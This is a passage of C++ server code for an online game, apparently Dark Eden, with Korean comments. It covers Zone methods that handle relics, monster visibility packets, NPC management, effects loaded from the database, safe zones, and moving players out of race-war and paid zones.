			g_pCombatInfoManager->setRelicOwner(relicIndex, CombatInfoManager::RELIC_OWNER_SLAYER);
		}
		else
		{
			EffectVampireRelic* pEffect = new EffectVampireRelic(pMonsterCorpse);
			pMonsterCorpse->getEffectManager().addEffect( pEffect );
			pMonsterCorpse->setFlag(Effect::EFFECT_CLASS_VAMPIRE_RELIC);
			pEffect->affect(pMonsterCorpse);
			g_pCombatInfoManager->setRelicOwner(relicIndex, CombatInfoManager::RELIC_OWNER_VAMPIRE);
		}

		//cout << "addTreasure OK" << endl;

		// 바로 Zone에 추가하면 안되므로(동기화 문제)
		// Effect를 사용해서 추가하도록 한다.
		EffectAddItem* pEffectAddItem = new EffectAddItem(this, cx, cy, pMonsterCorpse, 0, false);
		pEffectAddItem->setNextTime(999999);
		m_ObjectRegistry.registerObject(pEffectAddItem);

		addEffect_LOCKING(pEffectAddItem);

		//cout << "addRelic OK" << endl;
	}

	return true;
	
	__END_CATCH
}

//-------------------------------------------------------------
// delete Relic Item
//-------------------------------------------------------------
// 아이템을 삭제하는데.. 다른 thread에서 해도 된다.
// 다른 heartbeat에서 삭제된다.
//-------------------------------------------------------------
bool Zone::deleteRelicItem()
	
{
	__BEGIN_TRY

	// 성물 보관대가 없다면 리턴
	if (!m_bHasRelicTable)
	{
		return false;
	}

	// 성물 보관대를 찾는다.
	Item* pItem = dynamic_cast<Item*>( getTile( m_RelicTableX, m_RelicTableY ).getObject( m_RelicTableOID ) );
	Assert( pItem != NULL );

	// 바로 Zone에 추가하면 안되므로(동기화 문제)
	// Effect를 사용해서 추가하도록 한다.
	EffectDeleteItem* pEffectDeleteItem = new EffectDeleteItem( this, m_RelicTableX, m_RelicTableY, pItem, 0 );
	pEffectDeleteItem->setNextTime( 999999 );
	m_ObjectRegistry.registerObject( pEffectDeleteItem );

	addEffect_LOCKING( pEffectDeleteItem );

	//cout << "delete Relic OK" << endl;

	m_bHasRelicTable = false;

	return true;
	
	__END_CATCH
}

//-------------------------------------------------------------
// create MonsterAddPacket
//-------------------------------------------------------------
// monster의 상태에 따라서 GCAddXXX packet을 생성한다. by sigi
//-------------------------------------------------------------
Packet* Zone::createMonsterAddPacket(Monster* pMonster, Creature* pPC) const
	
{
	Assert( pMonster != NULL );

	// 보는 사람이 설정되지 않은 경우
	// 다~ 볼 수 있는 상태라고 설정한다.
	// 일단 packet을 생성해두고 체크하기 위해서다.
	if ( pPC != NULL && !canSee( pPC, pMonster ) ) return NULL;
//	bool canSeeAll = (pPC==NULL);

	// ObservingEye 이펙트를 가져온다.
//	EffectObservingEye* pEffectObservingEye = NULL;
//	if ( pPC != NULL && pPC->isFlag( Effect::EFFECT_CLASS_OBSERVING_EYE ) )
//	{
//		pEffectObservingEye = dynamic_cast<EffectObservingEye*>(pPC->findEffect( Effect::EFFECT_CLASS_OBSERVING_EYE ) );
//		//Assert( pEffectObservingEye );
//	}

	if (pMonster->isFlag(Effect::EFFECT_CLASS_HIDE)) 
	{
		// 뱀파거나 볼 수 있다면..
//		if (canSeeAll 
//			|| pPC->isVampire() 
//			|| pPC->isFlag(Effect::EFFECT_CLASS_DETECT_HIDDEN) )
//			|| ( pEffectRevealer != NULL && pEffectRevealer->canSeeHide( pMonster ) ) ) 	
		{
			GCAddBurrowingCreature* pPacket = new GCAddBurrowingCreature();

			pPacket->setObjectID(pMonster->getObjectID());
			pPacket->setName(pMonster->getName());
			pPacket->setX(pMonster->getX());
			pPacket->setY(pMonster->getY());

			return pPacket;
		}

	} 
	// 박쥐인 상태
	else if (pMonster->isFlag(Effect::EFFECT_CLASS_TRANSFORM_TO_BAT))
	{
		GCAddBat* pPacket = new GCAddBat();
		pPacket->setObjectID(pMonster->getObjectID());
		pPacket->setName(pMonster->getName());
		pPacket->setXYDir(pMonster->getX(), pMonster->getY(), pMonster->getDir());
		pPacket->setItemType( 0 );	// 아직 안 쓴다.
		pPacket->setMaxHP( pMonster->getHP(ATTR_MAX) );
		pPacket->setCurrentHP( pMonster->getHP(ATTR_CURRENT) );
		pPacket->setGuildID( 1 );
		pPacket->setColor( 0 );

		return pPacket;
	} 
	// 늑대인 상태
	else if (pMonster->isFlag(Effect::EFFECT_CLASS_TRANSFORM_TO_WOLF))
	{
		GCAddWolf* pPacket = new GCAddWolf();
		pPacket->setObjectID(pMonster->getObjectID());
		pPacket->setName(pMonster->getName());
		pPacket->setXYDir(pMonster->getX(), pMonster->getY(), pMonster->getDir());
		pPacket->setItemType( 0 );	// 아직 안 쓴다.
		pPacket->setMaxHP( pMonster->getHP(ATTR_MAX) );
		pPacket->setCurrentHP( pMonster->getHP(ATTR_CURRENT) );
		pPacket->setGuildID( 1 );

		return pPacket;
	}
	// invisiblity 상태
	else if (pMonster->isFlag(Effect::EFFECT_CLASS_INVISIBILITY))
	{
		// 보이나? 뱀파거나 볼수 있다면..
//		if (canSeeAll 
//			|| pPC->isVampire() 
//			|| pPC->isFlag(Effect::EFFECT_CLASS_DETECT_INVISIBILITY)
//			|| ( pEffectObservingEye != NULL && pEffectObservingEye->canSeeInvisibility( pMonster ) ) )
		{
			// FIXME
			// 설정에따라서 어떻게 보일지 결정된 후..
			GCAddMonster* pPacket = new GCAddMonster();
			makeGCAddMonster(pPacket, pMonster);
			pPacket->setEffectInfo(pMonster->getEffectInfo());

			return pPacket;
		}
	}
	else
	{
		GCAddMonster* pPacket = new GCAddMonster();
		makeGCAddMonster(pPacket, pMonster);

		return pPacket;
	}

	return NULL;
}

list<NPCInfo*>* Zone::getNPCInfos(void)
{ 
	return &m_NPCInfos; 
}

void Zone::addNPCInfo(NPCInfo* pInfo) 
{ 
	// 이거 zone delete할때 지워야된데이.. - -;	by sigi
	m_NPCInfos.push_back(pInfo); 
}

const BPOINT& Zone::getRandomMonsterRegenPosition() const
{
	return m_MonsterRegenPositions[rand() % m_MonsterRegenPositions.size()];
}

const BPOINT& Zone::getRandomEmptyTilePosition() const
{
	return m_EmptyTilePositions[rand() % m_EmptyTilePositions.size()];
}

void Zone::initLoadValue()
{
	m_LoadValue = 0;
	getCurrentTime( m_LoadValueStartTime );
}

DWORD Zone::getLoadValue() const
{
	Timeval currentTime;
	getCurrentTime( currentTime );

	Timeval elapsedTime = timediff(currentTime, m_LoadValueStartTime);

	if (elapsedTime.tv_sec==0)
	{
		return 200;
	}

	// 10초당 loop수
	DWORD loadValue = m_LoadValue*10 / elapsedTime.tv_sec;

	return loadValue;
}

void Zone::monsterScan(Monster* pMonster, ZoneCoord_t x, ZoneCoord_t y, Dir_t dir) 
	
{
	__BEGIN_TRY

//#ifdef __MONSTER_FIGHTING__

	// [TEST CODE]

	switch ( pMonster->getMonsterType() )
	{
		case 717:
		case 721:
		case 723:
		case 724:
		case 725:
			{
				unordered_map<ObjectID_t, Creature*>::iterator itr = m_pPCManager->getCreatures().begin();
				unordered_map<ObjectID_t, Creature*>::iterator endItr = m_pPCManager->getCreatures().end();

				for ( ; itr != endItr ; ++itr )
				{
					pMonster->addPotentialEnemy( itr->second );
				}
				break;
			}
		default:
			break;
	}

	ZoneCoord_t x2 = x;
	ZoneCoord_t y2 = y;

	//////////////////////////////////////////////////////////////////////////////
	// 시야 영역의 상하좌우 모두 + 1 씩 증가시킨다. 
	// 이유는 방향에 따른 ON_SIGHT 영역이 증가되기 때문이다.
	//////////////////////////////////////////////////////////////////////////////
	int sight = pMonster->getSight();

	for (ZoneCoord_t ix = max(0, x2 - sight - 1), endx = min(m_Width - 1, x2 + sight + 1) ; ix <= endx ; ix++) 
	{
		for (ZoneCoord_t iy = max(0, y2 - sight - 1), endy = min(m_Height - 1, y2 + sight + 1) ; iy <= endy ; iy++) 
		{
			//if (pPC->isFlag(Effect::EFFECT_CLASS_DARKNESS)) sight = DARKNESS_SIGHT;
			
			// 현재 타일 위에 있는 모든 오브젝트들에 대해 반복한다.
			//const forward_list<Object*> & objectList = m_pTiles[ix][iy].getObjectList();
			const forward_list<Object*> & objectList = m_pTiles[ix][iy].getObjectList();
	
			forward_list<Object*>::const_iterator itr = objectList.begin();

			// 
			// object가 있는 경우만 
			// pVisionInfo->getVisionState()를 체크 하기 위해서
			// if - do~while 을 사용했다. by sigi. 2002.5.8
			//
			if (itr != objectList.end())
			{
				do		
				{
					Assert(*itr != NULL);

					Object::ObjectClass OClass = (*itr)->getObjectClass();

					////////////////////////////////////////////////////////////
					// 각 객체의 OBJECT CLASS에 따라서 적합한 GCAddXXX 패킷을
					// 만들어서 owner 에게 전송한다. 
					////////////////////////////////////////////////////////////
					
					////////////////////////////////////////////////////////////
					// 타일 위에 크리처가 있을 경우
					////////////////////////////////////////////////////////////
					if (OClass == Object::OBJECT_CLASS_CREATURE)
					{
						Creature* pCreature = dynamic_cast<Creature*>(*itr);
						Assert(pCreature != NULL);

						Creature::CreatureClass CClass = pCreature->getCreatureClass();

						if (pCreature->isPC())
						{
							if (pMonster->isEnemyToAttack( pCreature ))
							{
								pMonster->addPotentialEnemy(pCreature);
							}
						}
						else if (CClass == Creature::CREATURE_CLASS_MONSTER)
						{
							Monster* pOtherMonster = dynamic_cast<Monster*>(pCreature);

							VisionState vs = pOtherMonster->getVisionState(x2,y2);

							// Aggressive 몬스터에게만 적으로 등록시켜준다.
							if (vs >= IN_SIGHT) 
							{
								if (isPotentialEnemy(pMonster, pOtherMonster))
								{
									pMonster->addPotentialEnemy(pOtherMonster);
									pOtherMonster->addPotentialEnemy(pMonster);
								}
							}
						}
					}	// if (OClass==OBJECT_CLASS_CREATURE)
				} while ( ++itr != objectList.end() ); // do
			}	// if (itr != objectList.end())
		}	// for iy
	}	// for ix

//#endif

	__END_CATCH
}

/*
void Zone::setNPCMarketCondition(MarketCond_t NPCSell, MarketCond_t NPCBuy) 
	
{
	__BEGIN_TRY

	unordered_map<ObjectID_t, Creature*> NPCMap = m_pNPCManager->getCreatures();
	for (unordered_map<ObjectID_t, Creature*>::const_iterator i = NPCMap.begin(); i != NPCMap.end(); i++)
	{
		NPC* pNPC = dynamic_cast<NPC*>(i->second);

		pNPC->setMarketCondBuy( NPCBuy );
		pNPC->setMarketCondSell( NPCSell );
	
		pNPC->increaseShopVersion(SHOP_RACK_SPECIAL);
	}

	__END_CATCH
}
*/


bool Zone::deleteNPC(Creature* pCreature) 
	
{
	__BEGIN_TRY

	if (pCreature==NULL 
		|| !pCreature->isNPC())
		return false;

	try {

		deleteCreature(pCreature, pCreature->getX(), pCreature->getY());
		g_pPCFinder->deleteNPC(pCreature->getName());

	} catch (NoSuchElementException) {
		cout << "NoSuchNPC : " << pCreature->getName().c_str() 
				<< ", (" << pCreature->getX() << ", " << pCreature->getY() << ")" << endl;

		return false;
	}

	NPC* pNPC = dynamic_cast<NPC*>(pCreature);
	removeNPCInfo( pNPC );

	SAFE_DELETE(pCreature);

	return true;

	__END_CATCH
}

void Zone::sendNPCInfo()
	
{
	__BEGIN_TRY

	// NPC에 대한 정보를 클라이언트에게 보내준다.
	GCNPCInfo gcNPCInfo;

	list<NPCInfo*>::const_iterator itr = m_NPCInfos.begin();
	for (; itr != m_NPCInfos.end(); itr++)
	{
		NPCInfo* pInfo = *itr;
		gcNPCInfo.addNPCInfo(pInfo);
	}
	
	broadcastPacket( &gcNPCInfo );

	__END_CATCH
}


void Zone::loadNPCs(Race_t race) 
	
{
	__BEGIN_TRY

	m_pNPCManager->load( getZoneID(), race );

	sendNPCInfo();

	__END_CATCH
}

void Zone::deleteNPCs(Race_t race) 
	
{
	__BEGIN_TRY

	const unordered_map< ObjectID_t, Creature* >& NPCs = m_pNPCManager->getCreatures();	// unordered_map을 복사해서 써야한다.
	unordered_map< ObjectID_t, Creature* >::const_iterator itr = NPCs.begin();

	list<ObjectID_t> creatures;

	// 일단 ObjectID들을 저장해둔다.
	for (; itr!=NPCs.end(); itr++)
	{
		Creature* pCreature = itr->second;
		creatures.push_back( pCreature->getObjectID() );
	}

	list<ObjectID_t>::iterator oitr = creatures.begin();

	// NPC를 지운다.	
	for (; oitr!=creatures.end(); oitr++)
	{
		Creature* pCreature = m_pNPCManager->getCreature( *oitr );

		if (pCreature!=NULL)
		{
			Assert(pCreature->isNPC());
			
			NPC* pNPC = dynamic_cast<NPC*>(pCreature);

			if (pNPC->getRace()==race)
			{
				deleteNPC( pCreature );
			}
		}
	}

	sendNPCInfo();

	__END_CATCH
}

bool Zone::removeNPCInfo(NPC* pNPC)
{
	__BEGIN_TRY

	list<NPCInfo*>::iterator itr = m_NPCInfos.begin();

	for (; itr!=m_NPCInfos.end(); itr++)
	{
		NPCInfo* pNPCInfo = *itr;

		if ( pNPCInfo->getNPCID() == pNPC->getNPCID() )
		{
			SAFE_DELETE(pNPCInfo);
			m_NPCInfos.erase( itr );

			return true;
		}
	}

	return false;

	__END_CATCH
}

void Zone::loadEffect()
	
{
	__BEGIN_TRY

	Statement* pStmt = NULL;
	Result*	pResult = NULL;

	BEGIN_DB
	{
		pStmt = g_pDatabaseManager->getConnection("DARKEDEN")->createStatement();

		///////////////////////////////////////////////////////////////////////////////
		// EffectPKZoneRegen 로드
		///////////////////////////////////////////////////////////////////////////////
		pResult = pStmt->executeQuery("SELECT LeftX, TopY, RightX, BottomY FROM EffectPKZoneRegen WHERE ZoneID=%u", getZoneID());

		while (pResult->next()) 
		{
			int count = 0;

			ZoneCoord_t left = pResult->getInt( ++count );
			ZoneCoord_t top = pResult->getInt( ++count );
			ZoneCoord_t right = pResult->getInt( ++count );
			ZoneCoord_t bottom = pResult->getInt( ++count );

			EffectPKZoneRegen *pEffect = new EffectPKZoneRegen( this, left, top, right, bottom );
			pEffect->setSlayer();
			pEffect->setVampire();
			pEffect->setOusters();
			pEffect->setTurn( 10 );
			pEffect->setHP( 40 );
			pEffect->setNextTime(0);

			registerObject( pEffect );
			addEffect( pEffect );
		}

		///////////////////////////////////////////////////////////////////////////////
		// Gnome's Horn의 Waypoint 로드
		// WayPoint 주위의 3X3 타일에 있는 아우스터즈는 초당 1씩 HP,MP 가 회복된다.
		///////////////////////////////////////////////////////////////////////////////
		pResult = pStmt->executeQuery("SELECT X, Y FROM WayPointInfo WHERE ZoneID = %u AND Race = %d", getZoneID(), RACE_OUSTERS);

		while ( pResult->next() )
		{
			ZoneCoord_t X = pResult->getInt( 1 );
			ZoneCoord_t Y = pResult->getInt( 2 );

			if ( isValidZoneCoord( this, X-1, Y-1 )
				&& isValidZoneCoord( this, X+1, Y+1 )
			   )
			{
				EffectPKZoneRegen *pEffect = new EffectPKZoneRegen( this, X-1, Y-1, X+1, Y+1 );
				pEffect->setOusters();
				pEffect->setTurn( 10 );
				pEffect->setHP( 4 );
				pEffect->setNextTime(0);

				registerObject( pEffect );
				addEffect( pEffect );
			}
		}

		SAFE_DELETE(pStmt);
	}
	END_DB(pStmt)

//	if ( m_ZoneID == 3001 || m_ZoneID == 71 || m_ZoneID == 72 || m_ZoneID == 73 )
	g_pEffectLoaderManager->load(this);

	if ( m_ZoneID == 3002 )
	{
		EffectContinualGroundAttack* pEffect = new EffectContinualGroundAttack( this, Effect::EFFECT_CLASS_GROUND_ATTACK, 3 );
		pEffect->setDeadline(99999999);
		pEffect->setNumber( 7, 11 );

		registerObject( pEffect );
		addEffect( pEffect );
	}

	__END_CATCH
}

void Zone::releaseSafeZone()
	
{
	__BEGIN_TRY

	m_ZoneLevel = NO_SAFE_ZONE;

	// 존 레벨을 초기화시킨다.
	for (ZoneCoord_t x = 0; x < m_Width; x++)
		for (ZoneCoord_t y = 0; y < m_Height; y++)
			m_ppLevel[x][y] = m_ZoneLevel;

	__END_CATCH
}

void Zone::resetSafeZone()
	
{
	__BEGIN_TRY

	m_ZoneLevel = g_pZoneInfoManager->getZoneInfo( m_ZoneID )->getZoneLevel();

	// 존 레벨을 초기화시킨다.
	for (ZoneCoord_t x = 0; x < m_Width; x++)
		for (ZoneCoord_t y = 0; y < m_Height; y++)
			m_ppLevel[x][y] = m_ZoneLevel;

	__END_CATCH
}

void Zone::resetDarkLightInfo()
	
{
	__BEGIN_TRY

	m_pWeatherManager->resetDarkLightInfo();

	__END_CATCH
}

void
Zone::killAllMonsters() 
	
{
	__BEGIN_TRY

	__ENTER_CRITICAL_SECTION(m_Mutex)

	unordered_map< ObjectID_t, Creature* > & monsters = m_pMonsterManager->getCreatures();
	unordered_map< ObjectID_t, Creature* >::iterator itr = monsters.begin();

	for (; itr!=monsters.end(); itr++)
	{
		Creature* pCreature = itr->second;
		Monster* pMonster = dynamic_cast<Monster*>(pCreature);

		if (!pMonster->isFlag(Effect::EFFECT_CLASS_NO_DAMAGE))
		{
			pMonster->setHP( 0 );
		}
	}

	__LEAVE_CRITICAL_SECTION(m_Mutex)

	__END_CATCH
}

void
Zone::killAllMonsters_UNLOCK() 
	
{
	__BEGIN_TRY

	unordered_map< ObjectID_t, Creature* > & monsters = m_pMonsterManager->getCreatures();
	unordered_map< ObjectID_t, Creature* >::iterator itr = monsters.begin();

	for (; itr!=monsters.end(); itr++)
	{
		Creature* pCreature = itr->second;
		Monster* pMonster = dynamic_cast<Monster*>(pCreature);

		if (!pMonster->isFlag(Effect::EFFECT_CLASS_NO_DAMAGE))
		{
			pMonster->setHP( 0 );
		}
	}

	__END_CATCH
}

void Zone::killAllPCs() 
{
	__BEGIN_TRY

	unordered_map< ObjectID_t, Creature* > & pcs = m_pPCManager->getCreatures();
	unordered_map< ObjectID_t, Creature* >::iterator itr = pcs.begin();

	for (; itr!=pcs.end(); itr++)
	{
		Creature* pCreature = itr->second;

		if ( pCreature->isSlayer() )
		{
			dynamic_cast<Slayer*>(pCreature)->setHP(0);
		}
		else if ( pCreature->isVampire() )
		{
			dynamic_cast<Vampire*>(pCreature)->setHP(0);
		}
		else if ( pCreature->isOusters() )
		{
			dynamic_cast<Ousters*>(pCreature)->setHP(0);
		}
	}

	__END_CATCH
}

// 종족 전쟁에 참가하는 사람만 남긴다. 나머지는 kick한다.
void    Zone::remainRaceWarPlayers() 
	
{
	__BEGIN_TRY

	try {

	// 참가 인원 제한을 하지 않는다면 무시한다.
	if (!g_pVariableManager->isActiveRaceWarLimiter())
		return;

	__ENTER_CRITICAL_SECTION(m_Mutex)

	unordered_map< ObjectID_t, Creature* > & creatures = m_pPCManager->getCreatures();
	unordered_map< ObjectID_t, Creature* >::iterator itr = creatures.begin();

	for (; itr!=creatures.end(); itr++)
	{
		Creature* pCreature = itr->second;

		if (pCreature->isFlag( Effect::EFFECT_CLASS_RACE_WAR_JOIN_TICKET ))
			continue;

		Player* pPlayer = pCreature->getPlayer();
		Assert(pPlayer != NULL);

		GamePlayer* pGamePlayer = dynamic_cast<GamePlayer*>(pPlayer);

		Event* pEvent = pGamePlayer->getEvent(Event::EVENT_CLASS_TRANSPORT);
		if (pEvent==NULL)
		{
			PlayerCreature* pPC = dynamic_cast<PlayerCreature*>(pCreature);
			Assert(pPC!=NULL);

			ZONE_COORD   ZC;
			g_pResurrectLocationManager->getPosition( pPC, ZC );

			ZoneInfo* pZoneInfo = g_pZoneInfoManager->getZoneInfo( ZC.id );
			Assert(pZoneInfo!=NULL);

			EventTransport* pEventTransport = new EventTransport(pGamePlayer);

			pEventTransport->setDeadline( 15*10 );
			pEventTransport->setTargetZone(ZC.id, ZC.x, ZC.y);
			pEventTransport->setZoneName( pZoneInfo->getFullName() );

			// 몇 초후에 어디로 이동한다.고 보내준다.
			pEventTransport->sendMessage();

			pGamePlayer->addEvent(pEventTransport);
		}
		else
		{
			EventTransport* pEventTransport = dynamic_cast<EventTransport*>(pEvent);
			pEventTransport->sendMessage();
		}
	}

	__LEAVE_CRITICAL_SECTION(m_Mutex)

	} catch (Throwable& t) {
		cout << t.toString().c_str() << endl;
		throw;
	}

	__END_CATCH
}

bool Zone::isLevelWarZone() const
{
	switch ( m_ZoneID )
	{
		case 1131:
		case 1132:
		case 1133:
		case 1134:
			{
				return true;
			}
			break;
		default:
			{
				return false;
			}
			break;
	}
}

void    Zone::remainPayPlayer()
    
{
	__BEGIN_TRY

	try {

		unordered_map< ObjectID_t, Creature* > & creatures = m_pPCManager->getCreatures();
		unordered_map< ObjectID_t, Creature* >::iterator itr = creatures.begin();

		for (; itr!=creatures.end(); itr++)
		{
			Creature* pCreature = itr->second;
			Player* pPlayer = pCreature->getPlayer();
			Assert(pPlayer != NULL);

			GamePlayer* pGamePlayer = dynamic_cast<GamePlayer*>(pPlayer);

			if ( pGamePlayer->isPayPlaying() )
				continue;

			Event* pEvent = pGamePlayer->getEvent(Event::EVENT_CLASS_TRANSPORT);
			if (pEvent==NULL)
			{
				PlayerCreature* pPC = dynamic_cast<PlayerCreature*>(pCreature);
				Assert(pPC!=NULL);

				ZONE_COORD   ZC;
				g_pResurrectLocationManager->getPosition( pPC, ZC );

				ZoneInfo* pZoneInfo = g_pZoneInfoManager->getZoneInfo( ZC.id );
				Assert(pZoneInfo!=NULL);

				EventTransport* pEventTransport = new EventTransport(pGamePlayer);

				pEventTransport->setDeadline( 60*10 );
				pEventTransport->setTargetZone(ZC.id, ZC.x, ZC.y);
				pEventTransport->setZoneName( pZoneInfo->getFullName() );

				char msg[100];

				sprintf( msg, g_pStringPool->c_str( STRID_LEVEL_WAR_ZONE_FREE_CLOSE_1 ) );

				GCSystemMessage gcSystemMessage;
				gcSystemMessage.setMessage( msg );
				pPlayer->sendPacket( &gcSystemMessage );

				sprintf( msg, g_pStringPool->c_str( STRID_LEVEL_WAR_ZONE_FREE_CLOSE_2 ),
				pZoneInfo->getFullName().c_str() );

				gcSystemMessage.setMessage( msg );
				pPlayer->sendPacket( &gcSystemMessage );

				// 몇 초후에 어디로 이동한다.고 보내준다.
				//              pEventTransport->sendMessage();

				pGamePlayer->addEvent(pEventTransport);
			}
			else
			{
				EventTransport* pEventTransport = dynamic_cast<EventTransport*>(pEvent);
				pEventTransport->sendMessage();
			}
		}
	} catch (Throwable& t) {
		cout << t.toString().c_str() << endl;
		throw;
	}

	__END_CATCH
}

